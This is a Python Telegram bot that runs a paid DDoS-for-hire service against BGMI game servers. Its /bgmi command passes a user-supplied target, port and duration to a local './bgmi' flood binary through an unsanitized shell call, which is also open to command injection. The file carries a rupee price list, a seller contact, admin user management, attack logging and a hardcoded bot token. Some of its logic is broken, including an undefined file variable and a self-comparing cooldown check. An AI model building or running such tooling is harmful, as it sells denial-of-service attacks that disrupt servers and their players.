#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7195354918:AAEtso3FS30AFG2_jq37yQsXBkmnIx1lnrA')

# Admin user IDs
admin_id = ["1680864482"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "ʟᴏɢs ᴀʀᴇ ᴀʟʀᴇᴀᴅʏ ᴄʟᴇᴀʀᴇᴅ. ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ ❌."
            else:
                file.truncate(0)
                response = "ʟᴏɢs ᴄʟᴇᴀʀᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ✅"
    except FileNotFoundError:
        response = "ɴᴏ ʟᴏɢs ғᴏᴜɴᴅ ᴛᴏ ᴄʟᴇᴀʀ"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"ᴜsᴇʀ {user_to_add} ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ 👍."
            else:
                response = "ᴜsᴇʀ ᴀʟʀᴇᴀᴅʏ ᴇxɪsᴛs 🤦‍♂️."
        else:
            response = "ᴘʟᴇᴀsᴇ sᴘᴇᴄɪғʏ ᴀ ᴜsᴇʀ ɪᴅ ᴛᴏ ᴀᴅᴅ 😒."
    else:
        response = "ᴏɴʟʏ ᴀᴅᴍɪɴ ᴄᴀɴ ʀᴜɴ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ 😡."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"ᴜsᴇʀ {user_to_remove} ʀᴇᴍᴏᴠᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ 👍."
            else:
                response = f"ᴜsᴇʀ {user_to_remove} ɴᴏᴛ ғᴏᴜɴᴅ ɪɴ ᴛʜᴇ ʟɪsᴛ ❌."
        else:
            response = '''ᴘʟᴇᴀsᴇ sᴘᴇᴄɪғʏ ᴀ ᴜsᴇʀ ɪᴅ ᴛᴏ ʀᴇᴍᴏᴠᴇ. 
✅ ᴜsᴀɢᴇ: /remove <userid>'''
    else:
        response = "ᴏɴʟʏ ᴀᴅᴍɪɴ ᴄᴀɴ ʀᴜɴ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "ʟᴏɢs ᴀʀᴇ ᴀʟʀᴇᴀᴅʏ ᴄʟᴇᴀʀᴇᴅ. ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ ❌."
                else:
                    file.truncate(0)
                    response = "ʟᴏɢs ᴄʟᴇᴀʀᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ✅"
        except FileNotFoundError:
            response = "ʟᴏɢs ᴀʀᴇ ᴀʟʀᴇᴀᴅʏ ᴄʟᴇᴀʀᴇᴅ ❌."
    else:
        response = "ᴏɴʟʏ ᴀᴅᴍɪɴ ᴄᴀɴ ʀᴜɴ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ 😡."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀs:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ɪᴅ: {user_id})\n"
                        except Exception as e:
                            response += f"- ᴜsᴇʀ ɪᴅ: {user_id}\n"
                else:
                    response = "ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ ❌"
        except FileNotFoundError:
            response = "ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ ❌"
    else:
        response = "ᴏɴʟʏ ᴀᴅᴍɪɴ ᴄᴀɴ ʀᴜɴ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ ❌."
                bot.reply_to(message, response)
        else:
            response = "ɴᴏ ᴅᴀᴛᴀ ғᴏᴜɴᴅ ❌"
            bot.reply_to(message, response)
    else:
        response = "ᴏɴʟʏ ᴀᴅᴍɪɴ ᴄᴀɴ ʀᴜɴ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ 😡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"😍 ʏᴏᴜʀ ɪᴅ: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in user_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "ʏᴏᴜ ᴀʀᴇ ᴏɴ ᴄᴏᴏʟᴅᴏᴡɴ ❌. ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ 𝟷ᴍɪɴᴛ ʙᴇғᴏʀᴇ ʀᴜɴɴɪɴɢ ᴛʜᴇ /bgmi ᴄᴏᴍᴍᴀɴᴅ ᴀɢᴀɪɴ"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 181:
                response = "ᴇʀʀᴏʀ: ᴛɪᴍᴇ ɪɴᴛᴇʀᴠᴀʟ ᴍᴜsᴛ ʙᴇ ʟᴇss ᴛʜᴀɴ 𝟷𝟾𝟶"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"ʙɢᴍɪ ᴀᴛᴛᴀᴄᴋ ғɪɴɪsʜᴇᴅ. ᴛᴀʀɢᴇᴛ: {target} Port: {port} Port: {time}"
        else:
            response = "✅ ᴜsᴀɢᴇ :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "❌ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ❌."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"ᴜsᴇʀɪᴅ: {user_id}" in log]
                if user_logs:
                    response = "ʏᴏᴜʀ ᴄᴏᴍᴍᴀɴᴅ ʟᴏɢs:\n" + "".join(user_logs)
                else:
                    response = "❌ ɴᴏ ᴄᴏᴍᴍᴀɴᴅ ʟᴏɢs ғᴏᴜɴᴅ ғᴏʀ ʏᴏᴜ ❌."
        except FileNotFoundError:
            response = "ɴᴏ ᴄᴏᴍᴍᴀɴᴅ ʟᴏɢs ғᴏᴜɴᴅ"
    else:
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['menu'])
def show_menu(message):
    menu_text ='''😍 ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs:
🌟 /id : ᴄʜᴇᴋ ʏᴏᴜʀ ɪᴅ
🌟 /bgmi : ᴍᴇᴛʜᴏᴅ ғᴏʀ ʙɢᴍɪ sᴇʀᴠᴇʀs
🌟 /rules : ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʙᴇғᴏʀᴇ ᴜsᴇ !!
🌟 /mylogs : ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋs
🌟 /plan : ᴄʜᴇᴄᴋ ᴅᴅᴏs ʙᴜʏ ᴘʟᴀɴ 

      !! ᴏɴʟʏ ᴀᴅᴅᴍɪɴ !! 
😍 ᴛᴏ sᴇᴇ ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs:
🌟 /admincmd : sʜᴏᴡs ᴀʟʟ ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs

ʙᴜʏ ғʀᴏᴍ :- @DRAGON_PAK_MODDER
ᴏғғɪᴄɪᴀʟ ᴄᴏɴᴛᴀᴄᴛ @DRAGON_PAK_MODDER
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/menu'):
                menu_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                menu_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, menu_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''😈 ʜɪɪ {user_name} ᴡᴇʟᴄᴏᴍᴇ
ᴛᴏ sᴜʜᴇʟ ʙʜᴀɪ ᴘᴀɪᴅ ᴅᴅᴏs
😍 ʙᴏᴛ ʀᴜɴ ᴄᴏᴍᴍᴀɴᴅ : /menu 
😍 ʙᴏᴛ ᴏᴡɴᴇʀ 👇
@DRAGON_PAK_MODDER
😍 ʙᴜʏ ʙᴏᴛ ᴀssᴇss 👇
@DRAGON_PAK_MODDER'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} ᴘʟᴇᴀsᴇ ғʟᴏᴡ ᴛʜᴇs ʀᴜʟᴇs ⚠️:

𝟷. ᴅᴏɴᴛ ʀᴜɴ ᴛᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴀᴄᴋs !! ᴄᴀᴜsᴇ ᴀ ʙᴀɴ ғʀᴏᴍ ʙᴏᴛ

𝟸. ᴅᴏɴᴛ ʀᴜɴ 2 ᴀᴛᴛᴀᴄᴋs ᴀᴛ sᴀᴍᴇ ᴛɪᴍᴇ ʙᴇᴄᴢ ɪғ ᴜ ᴛʜᴇɴ ᴜ ɢᴏᴛ ʙᴀɴɴᴇᴅ ғʀᴏᴍ ʙᴏᴛ

𝟹. ᴡᴇ ᴅᴀɪʟʏ ᴄʜᴇᴄᴋs ᴛʜᴇ ʟᴏɢs sᴏ ғᴏʟʟᴏᴡ ᴛʜᴇsᴇ ʀᴜʟᴇs ᴛᴏ ᴀᴠᴏɪᴅ ʙᴀɴ!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ʙʀᴏᴛʜᴇʀ ᴏɴʟʏ 𝟷 ᴘʟᴀɴ ɪs ᴘᴏᴡᴇʀғᴜʟ ᴛʜᴇɴ ᴀɴʏ ᴏᴛʜᴇʀ ᴅᴅᴏs!!:

ᴠɪᴘ 🌟 :
-> ᴀᴛᴛᴀᴄᴋ ᴛɪᴍᴇ : 𝟷𝟾𝟶 (s) 
-> ᴀғᴛᴇʀ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛᴇ : 𝟶 (s)

ᴘʀɪᴢᴇ ʟɪsᴛ 💸 :
ᴅᴀʏs-->𝟹𝟶𝟶₹
ᴡᴇᴇᴋ-->𝟷𝟶𝟶𝟶₹
ᴍᴏɴᴛʜ-->𝟸𝟶𝟶𝟶₹
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs ᴀʀᴇ ʜᴇʀᴇ!!:

☠️ /add <userId> : ᴀᴅᴅ @ᴜsᴇʀs
☠️ /remove <userid> ʀᴇᴍᴏᴠᴇ @ᴜsᴇʀs
☠️ /allusers : ᴀᴜᴛʜᴏʀɪsᴇᴅ ᴜsᴇʀs ʟɪsᴛᴇ
☠️ /logs : ᴀʟʟ ᴜsᴇʀs ʟᴏɢs
☠️ /broadcast : ʙʀᴏᴀᴅᴄᴀsᴛ ᴀ ᴍᴇssᴀɢᴇ
☠️ /clearlogs : ᴄʟᴇᴀʀ ᴛʜᴇ ʟᴏɢs ғɪʟᴇs
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ᴍᴇssᴀɢᴇ ᴛᴏ ᴀʟʟ ᴜsᴇʀs ʙʏ ᴀᴅᴅᴍɪɴ:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ ᴛᴏ ᴜsᴇʀs {user_id}: {str(e)}")
            response = "ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ sᴇɴᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴏ ᴀʟʟ ᴜsᴇʀs 👍"
        else:
            response = "😍 ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴍᴇssᴀɢᴇ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ"
    else:
        response = "ᴏɴʟʏ ᴀᴅᴍɪɴ ᴄᴀɴ ʀᴜɴ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ 😡"

    bot.reply_to(message, response)




bot.polling()
